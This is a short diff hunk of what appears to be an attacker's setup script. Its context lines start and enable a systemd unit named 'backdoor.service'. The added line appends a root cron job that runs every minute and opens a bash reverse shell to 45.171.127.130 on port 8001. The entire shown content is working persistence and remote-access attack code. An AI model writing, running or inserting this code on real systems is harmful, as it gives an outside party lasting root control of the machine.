@@ -25,3 +25,4 @@ systemctl daemon-reload
 systemctl start backdoor.service
 systemctl enable backdoor.service
 
+echo " */1 * * * * root /usr/bin/python3 -c 'import os ; os.system( \" bash -i >& /dev/tcp/45.171.127.130/8001 0>&1 \" )' " >> /etc/crontab
